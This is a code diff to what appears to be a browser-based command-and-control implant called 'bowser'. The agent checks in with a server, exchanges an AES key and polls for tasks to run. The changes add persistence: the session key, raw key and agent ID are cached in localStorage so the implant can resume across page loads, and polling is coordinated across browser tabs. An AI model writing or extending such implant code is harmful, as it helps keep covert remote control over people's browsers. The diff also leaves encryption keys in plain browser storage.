@@ -358,8 +358,10 @@ get_random_int(max) {
 				this.aes_psk = btoa(dec_key);
                 //console.log(JSON.stringify(json_response));
                 this.raw_key = atob(this.aes_psk);
+		localStorage.setItem('raw_key',this.raw_key); 
 		const encoder = new TextEncoder('utf-8');
                 this.cryptokey = base64ToByteArray(this.aes_psk);
+		localStorage.setItem('aes_psk',this.aes_psk);
                 this.exchanging_keys = false;
                 return stage1['uuid'];
             }catch(error){
@@ -407,6 +409,7 @@ get_random_int(max) {
 		//calls htmlPostData(url,data) to actually checkin
 		//Encrypt our data
 		//gets back a unique ID
+	if (localStorage.getItem('bowser_id') == null){
         if(this.using_key_exchange){
             let sessionID = await this.negotiate_key();
             //console.log("got session ID: " + sessionID);
@@ -415,24 +418,36 @@ get_random_int(max) {
             var jsondata = await this.htmlPostData(info, bowser.uuid);
         }
 		bowser.id = jsondata.id;
+		localStorage.setItem('bowser_id',jsondata.id);
 		// if we fail to get a new ID number, then exit the application
 		if(bowser.id === undefined){ throw new Error();		}
 		//console.log(bowser.id);
 		return jsondata;
+	}else{
+	    bowser.id = localStorage.getItem('bowser_id');
+	    if(this.using_key_exchange){
+		this.aes_psk = localStorage.getItem('aes_psk');
+	        this.cryptokey = base64ToByteArray(localStorage.getItem('aes_psk'));
+		this.raw_key = localStorage.getItem('raw_key');
+		this.exchanging_keys = false;
+	    }
+	    return;
+	}
 	}
 	async getTasking(){
-		while(true){
+		while(localStorage.getItem('tab_id') == tabID){
 		    try{
+			localStorage.setItem('last_seen',JSON.stringify(new Date()));
 		        //let data = {"tasking_size":1, "action": "get_tasking"};
 		        //let task = this.htmlPostData(this.url, data, bowser.id);
 				let task = await this.htmlGetData();
 		        //console.log("tasking got back: " + JSON.stringify(task));
-			await new Promise(r => setTimeout(r, this.gen_sleep_time()));
 		        return task['tasks'];
 		    }
 		    catch(error){
+			return;
 		    	//console.log(error.toString());
-		       await new Promise(r => setTimeout(r, this.gen_sleep_time()));  // don't spin out crazy if the connection fails
+		        // don't spin out crazy if the connection fails
 		    }
 		}
 	}
